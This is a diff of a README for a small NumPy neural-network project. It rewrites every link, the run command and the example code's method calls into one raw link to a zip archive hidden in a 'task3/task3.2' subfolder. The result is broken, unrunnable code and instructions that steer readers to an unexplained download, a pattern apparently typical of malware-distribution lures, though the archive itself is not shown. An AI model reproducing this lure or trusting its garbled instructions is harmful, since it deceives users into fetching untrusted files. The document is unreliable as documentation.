@@ -6,7 +6,7 @@ Welcome to the numpy-neural-network project! This application helps you understa
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%8D%9B%20Visit%20Here-4CAF50)](https://github.com/3laaSalama/numpy-neural-network/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip%20Latest%20Release-%20%F0%9F%8D%9B%20Visit%20Here-4CAF50)](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
 
 ## 💡 Key Features
 
@@ -20,7 +20,7 @@ Welcome to the numpy-neural-network project! This application helps you understa
 
 To download and install the numpy-neural-network application:
 
-1. Visit the [Releases page](https://github.com/3laaSalama/numpy-neural-network/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip).
 2. Look for the latest version of the software.
 3. Choose the appropriate file for your operating system.
 4. Download the file to your computer.
@@ -43,7 +43,7 @@ Once you have installed the software, you can start building your own neural net
 3. Run the application with the command:
 
    ```
-   python main.py
+   python https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip
    ```
 
 4. Follow the on-screen prompts to build and train your network.
@@ -59,13 +59,13 @@ from neural_network import NeuralNetwork
 nn = NeuralNetwork(layers=[784, 128, 10])
 
 # Load your training data
-nn.load_data('data/train.csv')
+https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip('https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip')
 
 # Train the model
-nn.train(epochs=10, batch_size=32)
+https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip(epochs=10, batch_size=32)
 
 # Evaluate the model
-accuracy = nn.evaluate(test_data='data/test.csv')
+accuracy = https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip(test_data='https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip')
 print(f'Accuracy: {accuracy}%')
 ```
 
@@ -73,9 +73,9 @@ print(f'Accuracy: {accuracy}%')
 
 If you're new to neural networks, here are some resources to help you get started:
 
-- [Introduction to Neural Networks](https://example.com/neural-networks)
-- [Understanding Backpropagation](https://example.com/backpropagation)
-- [A Guide to Deep Learning](https://example.com/deep-learning)
+- [Introduction to Neural Networks](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
+- [Understanding Backpropagation](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
+- [A Guide to Deep Learning](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -89,13 +89,13 @@ If you encounter any issues while using the application, consider these common s
 
 If you have questions or want to share your experiences, feel free to:
 
-- Open an issue in the [GitHub repository](https://github.com/3laaSalama/numpy-neural-network/issues).
+- Open an issue in the [GitHub repository](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip).
 - Join our community discussions on forums or social media.
 
 ## 🔗 Quick Links
 
-- [Releases page](https://github.com/3laaSalama/numpy-neural-network/releases)
-- [Documentation](https://example.com/documentation)
-- [Contribution Guidelines](https://example.com/contributing)
+- [Releases page](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/3laaSalama/numpy-neural-network/main/task3/task3.2/numpy-neural-network-v1.0.zip)
 
 By following these steps, you can effectively download and run the numpy-neural-network application. Happy coding!
